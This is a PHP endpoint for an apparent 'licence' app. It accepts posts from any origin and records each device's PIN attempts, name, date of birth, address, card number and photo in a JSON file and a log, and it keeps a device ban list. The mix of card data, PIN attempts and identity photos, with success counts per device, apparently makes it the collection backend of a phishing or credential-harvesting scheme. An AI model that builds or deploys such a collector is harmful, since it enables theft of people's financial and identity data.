<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

$data = json_decode(file_get_contents('php://input'), true) ?? [];

$bannedFile = '/var/www/licence/banned_devices.txt';
$deviceId = $data['deviceId'] ?? 'unknown';

// === EARLY BAN CHECK ===
if (file_exists($bannedFile)) {
    $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($deviceId, $banned)) {
        http_response_code(403);
        echo "Access Denied - You have been banned.";
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($data)) {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    $event   = $data['event'] ?? 'unknown';
    $success = $data['success'] ?? false;
    $pin     = $data['pin_attempt'] ?? '—';
    $name    = $data['name'] ?? '—';
    $dob     = $data['dob'] ?? '—';
    $address = $data['address'] ?? '—';
    $card    = $data['card'] ?? '—';
    $photo   = $data['photo'] ?? null;
    
    $stateFile = '/var/log/licence-app/latest_state.json';
    $state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
    
    // Update or create device entry
    if (!isset($state[$deviceId])) {
        $state[$deviceId] = [
            'deviceId' => $deviceId,
            'success_count' => 0,
            'fail_count' => 0,
            'history' => []
        ];
    }
    
    $state[$deviceId]['ip'] = $ip;
    $state[$deviceId]['last_seen'] = $timestamp;
    $state[$deviceId]['name'] = ($name !== '—') ? $name : ($state[$deviceId]['name'] ?? '—');
    $state[$deviceId]['dob'] = ($dob !== '—') ? $dob : ($state[$deviceId]['dob'] ?? '—');
    $state[$deviceId]['address'] = ($address !== '—') ? $address : ($state[$deviceId]['address'] ?? '—');
    $state[$deviceId]['card'] = ($card !== '—') ? $card : ($state[$deviceId]['card'] ?? '—');
    
    if ($photo) {
        $state[$deviceId]['photo'] = $photo;
    }
    
    if ($success === true || $success === 'YES') {
        $state[$deviceId]['success_count']++;
        $state[$deviceId]['has_success'] = true;
    } else if ($event === 'pin_failed') {
        $state[$deviceId]['fail_count']++;
    }
    
    // Add to history (limit to last 10 events to prevent massive JSON)
    array_unshift($state[$deviceId]['history'], [
        'timestamp' => $timestamp,
        'event' => $event,
        'success' => $success,
        'pin' => $pin
    ]);
    $state[$deviceId]['history'] = array_slice($state[$deviceId]['history'], 0, 10);
    
    file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT));
    
    // Also write to a flat access log for redundancy
    $logLine = sprintf("[%s] IP: %s | ID: %s | Event: %s | Success: %s | Name: %s\n", 
        $timestamp, $ip, $deviceId, $event, $success ? 'YES' : 'NO', $name);
    file_put_contents('/var/log/licence-app/access.log', $logLine, FILE_APPEND | LOCK_EX);
}

http_response_code(200);
?>
